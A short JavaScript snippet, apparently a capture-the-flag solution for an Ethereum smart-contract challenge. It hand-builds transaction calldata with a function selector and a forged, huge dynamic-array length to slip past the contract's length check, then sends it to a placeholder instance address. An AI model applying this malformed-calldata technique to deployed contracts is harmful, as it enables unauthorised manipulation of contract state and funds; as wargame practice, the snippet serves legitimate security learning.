FuncID="0x1d3d4c0b";
Location="0000000000000000000000000000000000000000000000000000000000000020";
DataLengh="1000000000000000000000000000000000000000000000000000000000000001";
data=FuncID+Location+DataLengh;
web3.eth.sendTransaction({from:'/*playerAddress*/',to:'/*instanceAddress*/',data: data,gas: 1111111},function(x,y){console.error(y)});